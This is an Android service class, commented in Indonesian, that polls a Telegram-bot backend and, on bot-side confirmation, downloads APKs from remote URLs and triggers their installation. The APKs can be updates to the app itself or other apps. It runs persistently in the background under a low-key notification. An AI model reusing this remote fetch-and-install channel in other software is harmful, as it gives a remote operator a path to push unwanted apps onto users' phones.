package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.io.File;

/**
 * Service polling untuk request update/install APK dari Telegram.
 *
 * Operasi yang ditangani:
 * - version    → tampilkan versi aplikasi saat ini
 * - update     → download APK dari URL lalu install (update diri sendiri)
 * - installapp → install APK aplikasi lain dari URL
 *
 * Alur update:
 * 1. User kirim /update [url]
 * 2. Bot kirim konfirmasi dengan inline button
 * 3. User klik Ya → request berubah jadi CONFIRMED
 * 4. Service download APK dengan laporan progress setiap 25%
 * 5. Download selesai → sistem menampilkan dialog install
 *
 * Wajib di AndroidManifest.xml:
 *   <service android:name=".UpdatePollingService" android:exported="false"/>
 */
public class UpdatePollingService extends Service {

    private static final String TAG             = "UpdatePollingService";
    private static final String CHANNEL_ID      = "update_polling";
    private static final int    NOTIFICATION_ID = 13000;

    private static final long POLL_INTERVAL_MS = 15_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling    = false;
    private boolean  isProcessing = false;

    // =========================================================
    // LIFECYCLE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isProcessing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result = ApiHelper.getUpdateRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId = request.optString("id",        "");
                String operation = request.optString("operation", "");
                String params    = request.optString("params",    "");
                String reqStatus = request.optString("status",    "");

                if (requestId.isEmpty() || operation.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                // /version tidak perlu konfirmasi
                if ("version".equals(operation)) {
                    isProcessing = true;
                    handleVersion(requestId);
                    return;
                }

                // Operasi lain butuh CONFIRMED
                if (!"CONFIRMED".equals(reqStatus)) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Update request CONFIRMED: op=" + operation);
                isProcessing = true;
                handleUpdateRequest(requestId, operation, params);

            } catch (Exception e) {
                Log.e(TAG, "Error polling update", e);
                isProcessing = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // CEK VERSI
    // =========================================================

    private void handleVersion(String requestId) {

        String version = UpdateHelper.getCurrentVersion(
                getApplicationContext());

        ApiHelper.sendUpdateResult(
                requestId, true,
                "📦 *Versi Aplikasi Saat Ini*\n\n" +
                "Versi: *" + version + "*\n\n" +
                "Gunakan /update [url] untuk memperbarui."
        );

        isProcessing = false;
        scheduleNextPoll(POLL_INTERVAL_MS);
    }

    // =========================================================
    // DOWNLOAD + INSTALL
    // =========================================================

    private void handleUpdateRequest(
            String requestId, String operation, String apkUrl) {

        final Context ctx = getApplicationContext();

        if (apkUrl.isEmpty()) {
            ApiHelper.sendUpdateResult(requestId, false,
                    "❌ URL APK tidak valid");
            isProcessing = false;
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        File outputFile = new File(ctx.getCacheDir(),
                "update_" + System.currentTimeMillis() + ".apk");

        // Kirim notifikasi awal
        ApiHelper.sendUpdateProgress(requestId,
                "⬇️ *Memulai download APK...*\n" +
                "URL: " + apkUrl);

        UpdateHelper.downloadApk(apkUrl, outputFile,
                new UpdateHelper.ProgressCallback() {

                    @Override
                    public void onProgress(
                            int percent, long downloaded, long total) {

                        String msg =
                                "⬇️ *Download APK...*\n" +
                                "Progress: *" + percent + "%*\n" +
                                UpdateHelper.formatSize(downloaded) +
                                " / " +
                                (total > 0 ? UpdateHelper.formatSize(total) : "?");

                        ApiHelper.sendUpdateProgress(requestId, msg);
                    }

                    @Override
                    public void onComplete(File apkFile) {

                        Log.d(TAG, "Download complete: " + apkFile.getName());

                        ApiHelper.sendUpdateProgress(requestId,
                                "✅ *Download selesai!*\n" +
                                "Ukuran: " +
                                UpdateHelper.formatSize(apkFile.length()) +
                                "\n\nMemulai instalasi...");

                        // Jeda sebentar supaya pesan progress terkirim dulu
                        try { Thread.sleep(1000); } catch (Exception ignored) {}

                        boolean installed = UpdateHelper.triggerInstall(
                                ctx, apkFile);

                        ApiHelper.sendUpdateResult(
                                requestId, installed,
                                installed
                                ? "📲 *Dialog instalasi muncul di HP.*\n" +
                                  "Tap *Install* untuk menyelesaikan update."
                                : "❌ Gagal membuka dialog instalasi.\n" +
                                  "Pastikan 'Install from unknown sources' " +
                                  "sudah diaktifkan untuk Myapk."
                        );

                        isProcessing = false;
                        scheduleNextPoll(POLL_INTERVAL_MS);
                    }

                    @Override
                    public void onError(String message) {
                        Log.e(TAG, "Download error: " + message);

                        ApiHelper.sendUpdateResult(
                                requestId, false,
                                "❌ *Download gagal*\n" + message
                        );

                        // Hapus file gagal
                        if (outputFile.exists()) outputFile.delete();

                        isProcessing = false;
                        scheduleNextPoll(POLL_INTERVAL_MS);
                    }
                }
        );
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Myapk", NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.stat_sys_download)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, UpdatePollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, UpdatePollingService.class));
    }
}
